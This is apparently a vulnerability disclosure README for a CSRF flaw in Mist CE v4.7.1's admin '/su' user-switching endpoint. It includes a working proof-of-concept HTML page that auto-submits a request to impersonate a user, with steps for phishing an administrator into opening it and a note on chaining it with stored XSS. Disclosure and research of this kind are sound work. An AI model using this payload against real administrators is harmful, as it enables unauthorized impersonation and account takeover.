# CVE-2025-MIST-CSRF  
## Cross-Site Request Forgery (CSRF) in Admin's Switch User Operation

## 📜 Description
**Mist Community Edition (CE) v4.7.1** contains a **Cross-Site Request Forgery (CSRF)** vulnerability in the admin's user-switching operation. The vulnerable endpoint, `/su?email=<user email>`, allows administrators to impersonate users by simply visiting a crafted malicious page. Unlike other endpoints, this one lacks proper protection, which makes it vulnerable to exploitation. An attacker can craft a malicious HTML form that submits a request to the `/su` endpoint, enabling unauthorized actions within the context of an administrator’s session.

## 📌 Affected Version
- Mist Community Edition (CE) v4.7.1
- Other versions prior to v4.7.1 may also be affected

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## 💻 Exploit Details

### 🔹 **CSRF Exploitation**
An attacker can exploit this vulnerability by phishing or tricking an administrator into visiting a malicious webpage. The crafted form sends a POST request to the vulnerable `/su?email=<user email>` endpoint, impersonating a specified user and performing actions on their behalf. This could lead to:
- **Unauthorized administrative actions**
- **Sensitive information disclosure**
- **Session hijacking**

### 🔹 **Chaining with Other Vulnerabilities**
This vulnerability can be combined with other weaknesses, such as the **Stored XSS** in the tag field, to further escalate attacks, potentially leading to **account takeover**.

## 🛠️ Steps to Reproduce

### 1️⃣ Craft Malicious HTML Form
Create a malicious HTML form designed to impersonate a specific user (e.g., `v@victim.com`). Here’s an example of the malicious form:
```html
<html>
  <body>
    <form action="http://192.168.1.5/su">
      <input type="hidden" name="email" value="v@victim.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState(‘’, ‘’, ‘/’);
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 2️⃣ Send Malicious Form to Administrator
- The attacker sends this crafted page to an administrator (e.g., via phishing or other social engineering techniques).
  
### 3️⃣ Administrator Visits Malicious Page
- Upon visiting the page, the form automatically submits, and the administrator is tricked into performing a user switch, impersonating the attacker’s specified user.
  
### 4️⃣ Exploiting the Admin's Session
- The admin unknowingly executes the malicious request, performing actions on behalf of the impersonated user.

## 🎬 Demonstration Video
<a href="https://youtu.be/M3AQ67t3ths" target="_blank">
  <img src="https://img.youtube.com/vi/M3AQ67t3ths/maxresdefault.jpg" width="700" height="380"/>
</a>

## 🧑‍💻 Discovery
- The **CVE-2025-XXXX** vulnerability was discovered by **Alex Perrakis (Stolichnayer)**.

## 🔗 References:
- [Mist CE Github Repository](https://github.com/mistio/mist-ce)
